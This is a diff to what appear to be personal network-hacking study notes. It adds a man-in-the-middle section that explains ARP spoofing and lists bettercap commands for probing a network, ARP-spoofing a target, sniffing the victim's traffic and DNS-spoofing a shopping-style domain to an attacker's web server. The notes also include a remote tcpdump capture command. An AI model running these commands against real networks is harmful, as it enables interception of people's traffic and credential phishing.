@@ -153,8 +153,22 @@ function Main() {
 ssh -T frank@192.168.1.131 "sudo timeout 60 tcpdump -i wlan0 \"not port 22 and not host localhost\" -w - " > tcp_dump1.pcap
 [specifies not to use 'local host' or port 22'. time out is at 60 seconds
 
-------------------------------------------------------[MITM-MAN-IN-THE-MIDDLE-------------------------------------------
+------------------------------------------------------[MITM-MAN-IN-THE-MIDDLE]-------------------------------------------
+
+[arp-spoof] victim convisnced they are  talking to server, but the spoof server is listening  in  the midle]
+
 mitweb [HAS NICE GUI]
+
+bettercap :
+
+net.probe on [shows whos on the network]
+net.show [gives list of MAC and IP in graph]
+set arp.spoof.targets [192.xxx]
+arp.spoof on 
+net.sniff on [tells attacker what the victim is doing [inbound and out bound] 
+set dns.spoof.domains myebay.com [redirects to APACHE config]
+
+
 
 --------------------------------------------------- FIND IP FROM DOMAIN --------------------------------------
 use ping, to see various hops. [will get firewalle] 
